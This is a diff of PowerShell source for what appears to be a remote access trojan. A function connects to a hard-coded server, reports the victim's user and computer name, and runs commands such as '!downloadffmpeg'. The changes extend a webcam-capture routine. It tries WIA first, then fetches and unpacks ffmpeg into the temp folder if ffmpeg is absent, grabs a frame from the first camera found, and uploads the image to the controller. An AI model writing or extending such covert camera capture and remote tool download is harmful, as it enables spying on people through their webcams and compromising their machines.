@@ -1,4 +1,31 @@
 cmd /c "chcp 65001" | Out-Null
+function Download-Ffmpeg {
+    param (
+        [string]$ffmpegUrl = "https://example.com/ffmpeg.zip"  # Замените на актуальный URL для скачивания ffmpeg
+    )
+    try {
+        $ffmpegZip = "$env:TEMP\ffmpeg.zip"
+        Write-Host "[*] Starting download of ffmpeg from $ffmpegUrl..."
+        Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegZip -UseBasicParsing -Verbose
+        Write-Host "[*] Download complete. Extracting ffmpeg..."
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        $extractPath = "$env:TEMP\ffmpeg_extracted"
+        if (Test-Path $extractPath) { Remove-Item -Recurse -Force $extractPath }
+        New-Item -ItemType Directory -Path $extractPath | Out-Null
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($ffmpegZip, $extractPath)
+        Write-Host "[*] Extraction complete."
+        $ffmpegExe = Join-Path $extractPath "ffmpeg.exe"
+        if (Test-Path $ffmpegExe) {
+            return "[+] ffmpeg downloaded and extracted successfully to: $ffmpegExe"
+        }
+        else {
+            return "[ERROR] ffmpeg.exe not found after extraction."
+        }
+    }
+    catch {
+        return "[ERROR] Failed to download/extract ffmpeg: $($_.Exception.Message)"
+    }
+}
 
 function Connect-ZiPo {
     $srv = "192.168.50.228"
@@ -225,7 +252,7 @@ function Connect-ZiPo {
 
     function Capture-Webcam {
     try {
-        # WIA попытка
+        # Попытка захвата через WIA
         $manager = New-Object -ComObject WIA.DeviceManager
         foreach ($deviceInfo in $manager.DeviceInfos) {
             try {
@@ -239,38 +266,60 @@ function Connect-ZiPo {
                 continue
             }
         }
-
-        # Если WIA не нашла камеры — попытка через ffmpeg
+        
+        # Если WIA не обнаружила камеры – пробуем ffmpeg
         $ffmpegPath = "ffmpeg"
-        $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
-
-        # Убедимся, что ffmpeg доступен
+        Write-Host "[*] No camera found via WIA. Checking ffmpeg..."
         $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
-        if ($LASTEXITCODE -eq 0) {
-            # Найдём название камеры
-            $cameraName = (& cmd /c "$ffmpegPath -list_devices true -f dshow -i dummy" 2>&1) |
-                Select-String "DirectShow video devices" -Context 0,10 |
-                Where-Object { $_.Line -match '"(.*)"' } |
-                ForEach-Object { ($_ -split '"')[1] } |
-                Select-Object -First 1
-
-            if ($cameraName) {
-                # Снимаем кадр
-                Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=""$cameraName"" -frames:v 1 "$tempImage"" -NoNewWindow -Wait
-                if (Test-Path $tempImage) {
-                    return Upload-File $tempImage
-                }
+        if ($LASTEXITCODE -ne 0) {
+            Write-Host "[*] ffmpeg not found. Executing !downloadffmpeg command..."
+            $downloadResult = Download-Ffmpeg
+            Write-Host $downloadResult
+            if ($downloadResult -match "^\[\+\]") {
+                # Предполагаем, что ffmpeg.exe находится в $env:TEMP\ffmpeg_extracted\ffmpeg.exe после распаковки
+                $ffmpegPath = Join-Path "$env:TEMP\ffmpeg_extracted" "ffmpeg.exe"
             }
-            return "[ERROR] ffmpeg fallback failed: no camera device detected"
+            else {
+                return "[ERROR] Unable to download ffmpeg."
+            }
+        }
+        Write-Host "[*] Using ffmpeg at: $ffmpegPath"
+        $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
+        
+        # Получаем список устройств через ffmpeg (live логирование)
+        $cameraOutput = & cmd /c "$ffmpegPath -list_devices true -f dshow -i dummy" 2>&1
+        Write-Host "[*] ffmpeg device list:"
+        Write-Host $cameraOutput
+        
+        # Извлекаем название первого найденного устройства DirectShow
+        $cameraName = ($cameraOutput | Select-String "DirectShow video devices" -Context 0,10 |
+                       ForEach-Object { ($_ -split '"')[1] } | Select-Object -First 1)
+        if ($cameraName) {
+            Write-Host "[*] Camera detected: $cameraName. Capturing image..."
+            Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=""$cameraName"" -frames:v 1 ""$tempImage""" -NoNewWindow -Wait
+            if (Test-Path $tempImage) {
+                Write-Host "[*] Image captured successfully."
+                return Upload-File $tempImage
+            }
+            else {
+                return "[ERROR] Failed to capture image using ffmpeg."
+            }
         }
         else {
-            return "[ERROR] No usable webcam device found via WIA, and ffmpeg is not available"
+            return "[ERROR] ffmpeg fallback did not detect any camera."
         }
     }
     catch {
         return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
     }
 }
+
+
+
+
+
+
+
 
     function Tree-List {
     try {
@@ -339,7 +388,9 @@ ${esc}[31m
    \ \   __\ \ \  \_|\ \ \   __  \ \  \   
     \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
      \ \__\    \ \_______\ \__\ \__\ \_______\
-      \|__|     \|_______|\|__|\|__|\|_______|${esc}[0m
+      \|__|     \|_______|\|__|\|__|\|_______|
+                CAMTEST 1
+${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
